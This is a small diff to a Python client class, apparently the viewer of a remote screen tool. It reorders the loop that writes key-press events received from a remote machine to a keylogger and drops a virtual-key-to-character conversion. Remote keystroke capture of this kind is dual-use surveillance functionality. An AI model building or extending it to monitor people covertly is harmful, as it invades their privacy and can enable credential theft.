@@ -57,6 +57,12 @@ class Client():
                 continue
 
             data, rectImgs = recv_data
+            if data is not None and self.win.keyLogger is not None:
+                for item in data:
+                    if item[0] == "P" and item[1] is not None:
+                        #ASCII = MapVirtualKey(item[1], MAPVK_VK_TO_CHAR)
+                        self.win.keyLogger.write(item[1])
+
             #while self.win.cmdQueue:
             #    print(self.win.cmdQueue.popleft())
 
@@ -72,14 +78,6 @@ class Client():
             self.win.label.updated.emit(rectImgs)
             if self.win.rec:
                 self.writer.write(self.win.label.cvVer)
-
-            if data is not None and self.win.keyLogger is not None:
-                data = deque(data)
-                while data:
-                    item = data.popleft()
-                    if item[0] == "P":
-                        ASCII = MapVirtualKey(item[1], MAPVK_VK_TO_CHAR)
-                        self.win.keyLogger.write(chr(ASCII))
 
 
     def close(self):
